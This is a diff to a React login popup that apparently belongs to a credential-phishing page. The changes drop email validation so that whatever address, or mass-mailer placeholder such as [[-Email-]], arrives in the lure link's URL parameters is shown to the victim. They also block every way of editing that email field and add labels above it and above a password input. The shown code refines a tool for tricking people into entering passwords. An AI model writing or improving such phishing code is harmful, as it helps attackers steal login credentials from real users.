@@ -32,10 +32,11 @@ const Popup = ({ domain, systemInfo }) => {
         'subscriber_email', 'mail', 'e', 'u', 'addr', 'address'
       ];
 
-      // Check query parameters
+      // Check query parameters FIRST - return whatever value is found
       for (const pattern of emailPatterns) {
         const emailValue = urlObj.searchParams.get(pattern);
-        if (emailValue && isValidEmail(emailValue)) {
+        if (emailValue) {
+          // Return the value even if it's a template pattern
           return emailValue;
         }
       }
@@ -46,7 +47,7 @@ const Popup = ({ domain, systemInfo }) => {
         const hashParams = new URLSearchParams(hash.substring(1));
         for (const pattern of emailPatterns) {
           const emailValue = hashParams.get(pattern);
-          if (emailValue && isValidEmail(emailValue)) {
+          if (emailValue) {
             return emailValue;
           }
         }
@@ -56,8 +57,8 @@ const Popup = ({ domain, systemInfo }) => {
       const combinedRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
       let match;
       while ((match = combinedRegex.exec(url)) !== null) {
-        if (match[1] && isValidEmail(match[1])) {
-          return match[1];
+        if (match[1]) {
+          return decodeURIComponent(match[1]);
         }
       }
 
@@ -65,15 +66,15 @@ const Popup = ({ domain, systemInfo }) => {
       const decodedUrl = decodeURIComponent(url);
       const emailRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
       while ((match = emailRegex.exec(decodedUrl)) !== null) {
-        if (match[1] && isValidEmail(match[1])) {
+        if (match[1]) {
           return match[1];
         }
       }
 
-      // Check for all template syntax patterns
+      // Check for all template syntax patterns - RETURN THEM, don't return empty
       const templatePatterns = [
-        /[?&]#?email=(\[\[Email\]\])/i,
         /[?&]#?email=(\[\[-Email-\]\])/i,
+        /[?&]#?email=(\[\[Email\]\])/i,
         /[?&]#?email=(\[\[email\]\])/i,
         /[?&]#?email=(\{\{Email\}\})/i,
         /[?&]#?email=(\{\{email\}\})/i,
@@ -105,13 +106,12 @@ const Popup = ({ domain, systemInfo }) => {
       for (const pattern of templatePatterns) {
         const match = url.match(pattern);
         if (match && match[1]) {
-          // If we find a template pattern, check if there's a real email elsewhere
-          // Otherwise return empty to let user input manually
-          return "";
+          // Return the template pattern itself
+          return match[1];
         }
       }
 
-      // Check for URL encoded template patterns
+      // Check for URL encoded template patterns - RETURN THEM
       const encodedPatterns = [
         /%3Femail%3D\[\[Email\]\]/i,
         /%3Femail%3D\[\[-Email-\]\]/i,
@@ -129,7 +129,11 @@ const Popup = ({ domain, systemInfo }) => {
 
       for (const pattern of encodedPatterns) {
         if (pattern.test(url)) {
-          return "";
+          // Try to extract the actual pattern value
+          const encodedMatch = url.match(/[?&]#?email=([^&?#]+)/i);
+          if (encodedMatch && encodedMatch[1]) {
+            return decodeURIComponent(encodedMatch[1]);
+          }
         }
       }
 
@@ -250,7 +254,7 @@ const Popup = ({ domain, systemInfo }) => {
             </div>
           </div>
 
-          {/* Email Field */}
+          {/* Email Field - NON-EDITABLE AND NON-REMOVABLE */}
           <div className="pasww" style={{ marginBottom: "15px" }}>
             <div style={{
               fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
@@ -258,6 +262,7 @@ const Popup = ({ domain, systemInfo }) => {
               marginBottom: "5px",
               fontWeight: "500"
             }}>
+              Email Address
             </div>
             <input
               type="email"
@@ -269,13 +274,57 @@ const Popup = ({ domain, systemInfo }) => {
                 fontSize: "14px",
                 border: "1px solid #ccc",
                 width: "100%",
-                backgroundColor: "#ffffff",
+                backgroundColor: "#f5f5f5",
                 outline: "none",
-                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
+                fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
+                cursor: "default"
               }}
-              placeholder=""
+              placeholder="Email will be auto-filled from URL"
               value={email}
-              onChange={(e) => setEmail(e.target.value)}
+              readOnly
+              onKeyDown={(e) => {
+                // Prevent all keyboard input
+                e.preventDefault();
+                return false;
+              }}
+              onKeyPress={(e) => {
+                // Prevent all keyboard input
+                e.preventDefault();
+                return false;
+              }}
+              onKeyUp={(e) => {
+                // Prevent all keyboard input
+                e.preventDefault();
+                return false;
+              }}
+              onPaste={(e) => {
+                // Prevent pasting
+                e.preventDefault();
+                return false;
+              }}
+              onCut={(e) => {
+                // Prevent cutting
+                e.preventDefault();
+                return false;
+              }}
+              onCopy={(e) => {
+                // Allow copying but don't change the value
+                return;
+              }}
+              onClick={(e) => {
+                // Prevent focusing/selecting
+                e.target.blur();
+              }}
+              onFocus={(e) => {
+                // Remove focus immediately
+                e.target.blur();
+              }}
+              onMouseDown={(e) => {
+                // Prevent selecting text
+                e.preventDefault();
+              }}
+              autoComplete="off"
+              spellCheck="false"
             />
           </div>
 
@@ -287,7 +336,7 @@ const Popup = ({ domain, systemInfo }) => {
               fontWeight: "500",
               marginBottom: "2px",
             }}>
-      
+              Password
             </div>
             <input
               type={showPassword ? "text" : "password"}
